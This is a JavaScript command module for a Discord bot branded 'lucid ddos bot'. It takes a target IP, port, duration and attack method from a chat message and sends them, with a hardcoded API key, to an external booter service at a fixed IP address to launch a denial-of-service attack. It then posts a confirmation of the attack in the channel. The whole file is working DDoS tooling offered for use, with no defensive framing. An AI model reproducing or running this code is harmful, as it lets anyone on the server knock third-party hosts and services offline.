const Discord = require('discord.js')
const http = require('http')
const db = require('quick.db')
module.exports.run = async (client, message, args, config) => {
    if (!args[0]) return message.channel.send(`missing ip`)
    if (!args[1]) return message.channel.send(`missing port`)
    if (!args[2]) return message.channel.send(`missing time`)
    if (!args[3]) return message.channel.send(`missing method`)

    // ensure user is allowed
    let prf = db.fetch(`user_${message.author.id}`)
    if (prf == null) return message.channel.send(`You aren't allowed.`)

    http.get(`http://158.69.102.86:555/api/attack?key=X5QlnAXcF&ip=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3].toLowerCase()}`, (res) => {
        res.on('data', data => {
            message.channel.send(`
**───────────────────────────────
 lucid ddos bot       
───────────────────────────────
 Attack sent to __${args[0]}!__ 
───────────────────────────────
 Using Port: __${args[1]}!__    
───────────────────────────────
 For: __${args[2]}__ seconds!                              
───────────────────────────────
 Method: __${args[3]}!__        
───────────────────────────────**
~~**lucid bot :tm: **~~  `)
        })
    })
}